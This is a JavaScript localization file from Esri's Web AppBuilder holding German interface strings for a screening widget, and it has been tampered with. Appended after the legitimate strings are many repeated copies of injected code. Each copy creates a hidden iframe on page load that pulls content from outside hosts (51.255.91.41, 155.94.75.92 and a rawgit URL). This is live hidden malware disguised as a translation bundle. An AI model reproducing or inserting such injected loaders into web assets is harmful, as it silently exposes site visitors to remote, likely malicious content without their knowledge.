// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Screening/setting/nls/strings":{units:{feetUnit:"Fu\u00df / Quadratfu\u00df",milesUnit:"Meilen / Acres",metersUnit:"Meter / Quadratmeter",kilometersUnit:"Kilometer / Quadratkilometer",hectaresUnit:"Kilometer / Hektar"},analysisTab:{analysisTabLabel:"Analyse",selectAnalysisLayerLabel:"Analyse-Layer ausw\u00e4hlen",addLayerLabel:"Layer hinzuf\u00fcgen",noValidLayersForAnalysis:"Keine g\u00fcltigen Layer in der ausgew\u00e4hlten Webkarte gefunden.",noValidFieldsForAnalysis:"Keine g\u00fcltigen Felder in der ausgew\u00e4hlten Webkarte gefunden. Entfernen Sie den ausgew\u00e4hlten Layer.",
addLayersHintText:"Hinweis: W\u00e4hlen Sie Layer und Felder zur Analyse und Anzeige in Berichten aus.",addLayerNameTitle:"Layer-Name",addFieldsLabel:"Feld hinzuf\u00fcgen",addFieldsPopupTitle:"Felder ausw\u00e4hlen",addFieldsNameTitle:"Feldnamen",aoiToolsLegendLabel:"Werkzeuge f\u00fcr Interessenbereich",aoiToolsDescriptionLabel:"Aktivieren Sie Werkzeuge, um Interessenbereiche zu erstellen und deren Beschriftung festzulegen.",placenameLabel:"Ortsname",drawToolsLabel:"Zeichenwerkzeuge",uploadShapeFileLabel:"Ein Shapefile hochladen",
coordinatesLabel:"Koordinaten",coordinatesDrpDwnHintText:"Hinweis: W\u00e4hlen Sie die Einheit aus, um die eingegebenen Polygonz\u00fcge anzuzeigen.",coordinatesBearingDrpDwnHintText:"Hinweis: W\u00e4hlen Sie die Peilung aus, um die eingegebenen Polygonz\u00fcge anzuzeigen.",allowShapefilesUploadLabel:"Hochladen von Shapefile in die Analyse zulassen",allowShapefilesUploadLabelHintText:'Hinweis: Zeigen Sie in der Registerkarte "Bericht" die Option "Shapefile in Analyse hochladen" an.',allowVisibleLayerAnalysisLabel:"Keine Ergebnisse f\u00fcr nicht sichtbare Layer analysieren oder erfassen",
allowVisibleLayerAnalysisHintText:"Hinweis: Layer, die deaktiviert oder aufgrund der Sichtbarkeitseinstellungen des Ma\u00dfstabs nicht sichtbar sind, werden weder analysiert noch in gedruckte oder heruntergeladene Ergebnisse einbezogen.",areaUnitsLabel:"Analyseergebnisse anzeigen in",maxFeatureForAnalysisLabel:"H\u00f6chstanzahl f\u00fcr Analyse",maxFeatureForAnalysisHintText:"Hinweis: Legen Sie die H\u00f6chstanzahl der Features f\u00fcr die Analyse fest.",searchToleranceLabelText:"Suchtoleranz",
searchToleranceHint:"Hinweis: Die Suchtoleranz wird nur beim Analysieren von Punkt- und Linieneingaben verwendet.",placenameButtonText:"Ortsname",drawToolsButtonText:"Zeichnen",shapefileButtonText:"Shapefile",coordinatesButtonText:"Koordinaten",invalidLayerErrorMsg:"Konfigurieren Sie die Felder f\u00fcr"},downloadTab:{downloadLegend:"Downloadeinstellungen",reportLegend:"Berichtseinstellungen",downloadTabLabel:"Herunterladen",syncEnableOptionLabel:"Feature-Layer",syncEnableOptionHint:"Hinweis: Wird verwendet, um Feature-Informationen f\u00fcr Features herunterzuladen, die sich im Interessenbereich in den angegebenen Formaten schneiden.",
syncEnableOptionNote:'Hinweis: F\u00fcr die Option "File-Geodatabase" sind Feature-Services erforderlich, bei denen die Synchronsierung aktiviert ist.',extractDataTaskOptionLabel:'Task "Daten extrahieren" des Geoverarbeitungsservice',extractDataTaskOptionHint:'Hinweis: Verwenden Sie einen ver\u00f6ffentlichten Geoverarbeitungsservice mit dem Task "Daten extrahieren", um Features in File-Geodatabase- oder Shapefile-Formaten herunterzuladen, die sich im Interessenbereich schneiden.',cannotDownloadOptionLabel:"Download deaktivieren",
syncEnableTableHeaderTitle:{layerNameLabel:"Layer-Name",csvFileFormatLabel:"CSV",fileGDBFormatLabel:"File-Geodatabase",allowDownloadLabel:"Download zulassen"},setButtonLabel:"Festlegen",GPTaskLabel:"URL f\u00fcr Geoverarbeitungsservice angeben",printGPServiceLabel:"URL des Druckservice",setGPTaskTitle:"Erforderliche URL des Geoverarbeitungsservice angeben",logoLabel:"Logo",logoChooserHint:"Hinweis: Klicken Sie auf das Symbol des Bilds, um das Bild zu \u00e4ndern.",footnoteLabel:"Fu\u00dfnote",columnTitleColorPickerLabel:"Farbe f\u00fcr Spaltentitel",
reportTitleLabel:"Berichtstitel",errorMessages:{invalidGPTaskURL:'Ung\u00fcltiger Geoverarbeitungsservice. W\u00e4hlen Sie einen Geoverarbeitungsservice aus, der den Task "Daten extrahieren" beinhaltet.',noExtractDataTaskURL:'W\u00e4hlen Sie einen Geoverarbeitungsservice aus, der den Task "Daten extrahieren" beinhaltet.'}},generalTab:{generalTabLabel:"Allgemein",tabLabelsLegend:"Bereichsbeschriftungen",tabLabelsHint:"Hinweis: Geben Sie Beschriftungen an.",AOITabLabel:'Bereich  "Interessenbereich "',
ReportTabLabel:'Bereich  "Bericht "',bufferSettingsLegend:"Puffereinstellungen",defaultBufferDistanceLabel:"Standardpufferabstand",defaultBufferUnitsLabel:"Puffereinheiten",generalBufferSymbologyHint:"Hinweis: Legen Sie die Symbolisierung fest, die zur Anzeige von Puffern um Interessenbereiche herum verwendet werden soll.",aoiGraphicsSymbologyLegend:"Symbolisierung f\u00fcr Grafiken von Interessenbereichen",aoiGraphicsSymbologyHint:"Hinweis: Legen Sie die Symbolisierung fest, die beim Definieren von Interessenbereichen mit Punkten, Linien und Polygonen verwendet werden soll.",
pointSymbologyLabel:"Punkt",previewLabel:"Vorschau",lineSymbologyLabel:"Linie",polygonSymbologyLabel:"Polygon",aoiBufferSymbologyLabel:"Puffer-Symbolisierung",pointSymbolChooserPopupTitle:"Symbol f\u00fcr Adresse oder Position",polygonSymbolChooserPopupTitle:"Symbol zum Hervorheben des Polygons ausw\u00e4hlen",lineSymbolChooserPopupTitle:"Symbol zum Hervorheben der Linie ausw\u00e4hlen",aoiSymbolChooserPopupTitle:"Puffersymbol festlegen",aoiTabText:"AOI",reportTabText:"Bericht",invalidSymbolValue:"Ung\u00fcltiger Symbolwert."},
searchSourceSetting:{searchSourceSettingTabTitle:"Einstellungen der Suchquellen",searchSourceSettingTitle:"Einstellungen der Suchquellen",searchSourceSettingTitleHintText:"F\u00fcgen Sie Geokodierungsservices oder Feature-Layer als Suchquellen hinzu, und konfigurieren Sie diese. Anhand dieser angegebenen Quellen wird bestimmt, welche Elemente im Suchfeld durchsucht werden k\u00f6nnen.",addSearchSourceLabel:"Suchquelle hinzuf\u00fcgen",featureLayerLabel:"Feature-Layer",geocoderLabel:"Geocoder",generalSettingLabel:"Allgemeine Einstellung",
allPlaceholderLabel:"Platzhaltertext, um alle zu durchsuchen:",allPlaceholderHintText:"Hinweis: Geben Sie den Platzhaltertext zum Durchsuchen aller Layer und Geocoder ein.",generalSettingCheckboxLabel:"Pop-up f\u00fcr das gefundene Feature oder die gefundene Position anzeigen",countryCode:"L\u00e4nder- oder Regionscode(s)",countryCodeEg:"z.\u00a0B. ",countryCodeHint:"Wenn dieser Wert leer gelassen wird, werden alle L\u00e4nder und Regionen durchsucht.",questionMark:"?",searchInCurrentMapExtent:"Nur in der aktuellen Kartenausdehnung suchen",
zoomScale:"Zoom-Ma\u00dfstab",locatorUrl:"Geocoder-URL",locatorName:"Geocoder-Name",locatorExample:"Beispiel",locatorWarning:"Diese Version des Geokodierungsservice wird nicht unterst\u00fctzt. Das Widget unterst\u00fctzt Geokodierungsservices der Version 10.0 und h\u00f6her.",locatorTips:"Es sind keine Vorschl\u00e4ge verf\u00fcgbar, da der Geokodierungsservice die Vorschlagsfunktion nicht unterst\u00fctzt.",layerSource:"Layer-Quelle",setLayerSource:"Layer-Quelle festlegen",setGeocoderURL:"Geocoder-URL festlegen",
searchLayerTips:"Es sind keine Vorschl\u00e4ge verf\u00fcgbar, da der Feature-Service die Paginierungsfunktion nicht unterst\u00fctzt.",placeholder:"Platzhaltertext",searchFields:"Suchfelder",displayField:"Anzeigefeld",exactMatch:"Exakte \u00dcbereinstimmung",maxSuggestions:"Maximale Anzahl von Vorschl\u00e4gen",maxResults:"Maximale Anzahl von Ergebnissen",enableLocalSearch:"Lokale Suche aktivieren",minScale:"Min. Ma\u00dfstab",minScaleHint:"Wenn der Kartenma\u00dfstab gr\u00f6\u00dfer ist als dieser Ma\u00dfstab, wird die lokale Suche angewendet.",
radius:"Radius",radiusHint:"Erm\u00f6glicht die Festlegung des Radius einer Fl\u00e4che um den aktuellen Kartenmittelpunkt, der dazu dient, die Rangfolge von Geokodierungskandidaten zu optimieren. Die Kandidaten, die der Position am n\u00e4chsten liegen, werden auf diese Weise zuerst ausgegeben.",setSearchFields:"Suchfelder festlegen",set:"Festlegen",invalidUrlTip:"Die URL ${URL} ist ung\u00fcltig oder es kann nicht darauf zugegriffen werden.",invalidSearchSources:"Ung\u00fcltige Einstellungen der Suchquelle"},
errorMsg:{textboxFieldsEmptyErrorMsg:"F\u00fcllen Sie die erforderlichen Felder aus.",bufferDistanceFieldsErrorMsg:"Geben Sie g\u00fcltige Werte ein.",invalidSearchToleranceErrorMsg:"Geben Sie einen g\u00fcltigen Wert f\u00fcr die Suchtoleranz ein.",atLeastOneCheckboxCheckedErrorMsg:"Ung\u00fcltige Konfiguration: Mindestens ein AOI-Werkzeug ist erforderlich.",noLayerAvailableErrorMsg:"Keine Layer verf\u00fcgbar",layerNotSupportedErrorMsg:"Wird nicht unterst\u00fctzt ",noFieldSelected:'Verwenden Sie die Aktion "Bearbeiten", um Felder f\u00fcr die Analyse auszuw\u00e4hlen.',
duplicateFieldsLabels:'Doppelte Bezeichnung "${labelText}" f\u00fcr: "${itemNames}" hinzugef\u00fcgt',noLayerSelected:"W\u00e4hlen Sie mindestens einen Layer f\u00fcr die Analyse aus.",errorInSelectingLayer:"Der Operation zur Auswahl des Layers kann nicht abgeschlossen werden. Versuchen Sie es erneut.",errorInMaxFeatureCount:"Geben Sie einen g\u00fcltigen Wert f\u00fcr die H\u00f6chstzahl der Features zur Analyse ein."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});